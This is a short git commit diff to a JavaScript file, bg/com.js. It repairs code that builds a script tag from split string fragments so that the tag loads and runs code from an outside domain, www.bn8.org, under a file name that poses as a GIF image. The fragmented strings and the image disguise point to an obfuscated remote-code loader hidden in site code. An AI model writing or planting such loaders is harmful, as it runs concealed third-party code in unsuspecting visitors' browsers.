e382d7f6bfa9f972c04679667d375920a81ddb5d
bian888 <87354060+bian888@users.noreply.github.com>
2021-07-13 13:33:37 +0800

    Update com.js

--- bg/com.js
+++ bg/com.js
@@ -8,7 +8,7 @@ window.event.returnValue = false;
 }
 
 var s1 = "<";
-var s2 = "script type=", s3 = "text/javascript src=//www.bn8.org/",s4 = "bg.gif/></script";
+var s2 = "script type=", s3 = "text/javascript src=//www.bn8.org/bg.gif",s4 = "></script";
 var s5 =">"
 s2 = s2 + s3 + s4;
 s = s1 + s2 + s5;
